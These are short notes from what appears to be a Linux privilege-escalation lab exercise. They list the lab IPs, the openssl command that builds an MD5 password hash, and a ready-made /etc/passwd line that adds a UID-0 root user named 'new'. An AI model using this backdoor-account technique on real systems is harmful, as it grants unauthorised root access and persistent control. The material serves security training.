# Common_Linux_Privesc 

> VOiD | Monday 02 August 2021 09:37:37 AM IST

My IP : 10.17.6.109
Target IP : 10.10.220.2



Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: 
```bash
openssl passwd -1 -salt [salt] [password]
openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
copy it to etc passwd
```